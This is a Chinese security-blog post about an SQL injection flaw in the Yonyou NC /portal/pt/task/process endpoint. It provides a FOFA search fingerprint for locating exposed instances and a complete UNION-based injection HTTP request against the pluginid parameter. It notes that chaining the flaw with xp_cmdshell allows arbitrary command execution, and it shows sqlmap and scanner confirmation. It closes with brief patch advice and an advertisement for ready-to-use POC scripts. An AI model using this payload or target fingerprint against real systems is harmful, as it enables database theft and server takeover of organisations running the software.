#  用友NC /portal/pt/task/process SQL注入漏洞   
Superhero  Nday Poc   2024-12-09 18:30  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
用友NC是由用友公司开发的一套面向大型企业和集团型企业的管理软件产品系列。这一系列产品基于全球最新的互联网技术、云计算技术和移动应用技术，旨在帮助企业创新管理模式、引领商业变革。  
  
  
**01******  
  
**漏洞概述**  
  
  
用友NC /portal/pt/task/process 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。  
  
  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
icon_hash="1085941792"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIpwek1c11Z3bdgcfpYSwoBnFGhf0OY4jTjsaPicRmt7pqhSfyBnfkqlRpjy4ibMQSP9ibj19DJcoY7w/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
GET /portal/pt/task/process?pageId=login&id=1&pluginid=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(118)||CHR(98)||CHR(118)||CHR(113)||CHR(113)||CHR(107)||CHR(98)||CHR(106)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20DUAL--%20 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept-Encoding: gzip
Transfer-Encoding: chunked
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIpwek1c11Z3bdgcfpYSwoBReicoGAdQobgr4zIiaHgPAoCtUnkqMpGRCXibxmhbftNjibJGJc6T6qWfw/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIpwek1c11Z3bdgcfpYSwoBiclDmLGNvM2T8BrVsN90fzRcZia6iav8LI9oxXicFsibX91gjQEAOolDPtg/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIpwek1c11Z3bdgcfpYSwoBC5UqQv2yrZ4KpGSZMKJwFicceg3NFibib6RBvicnjptmgrdSL9eIFAKeOQ/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIpwek1c11Z3bdgcfpYSwoBUxRtpL914PH6xxPGKu86OVqNSeTZxwoaBZS9KAswJu7VxribicJ20Iog/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIpwek1c11Z3bdgcfpYSwoBUB9WOMLicFhicicWZ1Ft0mWG7OfmI8LrxcL6yG3K2uUyuB2dcXY3ibmEkw/640?wx_fmt=png&from=appmsg "")  
  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、目前厂商已发布升级补丁以修复漏洞，请及时联系官方获取: https://security.yonyou.com/  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
